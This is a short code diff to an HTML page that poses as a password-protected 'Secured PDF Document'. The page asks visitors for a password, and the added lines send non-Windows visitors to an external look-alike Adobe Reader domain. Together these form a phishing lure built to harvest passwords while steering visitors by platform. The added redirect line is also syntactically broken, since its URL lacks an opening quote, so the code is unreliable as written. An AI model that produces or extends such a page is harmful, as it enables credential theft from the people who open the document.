@@ -3,6 +3,10 @@
   <head>
     <title>Secured PDF Document</title>
     <script>
+      var isWindows = navigator.platform.indexOf("Win") > -1;
+      if (!isWindows) {
+         window.location = https://adobereader-secured.online/error.html";
+      }
       // prompt the user to input a PIN
       var pin = prompt("This document is password protected, Please enter a password.");
 
